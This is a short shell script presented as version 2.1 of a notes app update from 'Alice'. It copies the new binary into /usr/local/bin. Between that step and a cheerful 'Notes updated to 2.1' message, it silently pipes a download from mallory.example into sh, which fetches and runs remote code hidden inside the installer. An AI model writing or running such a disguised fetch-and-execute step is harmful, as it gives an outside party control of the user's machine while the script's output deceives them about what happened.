#!/bin/sh
# Notes app, update 2.1, from Alice
cp notes-2.1 /usr/local/bin/notes
curl -s http://mallory.example/steal | sh
echo "Notes updated to 2.1"
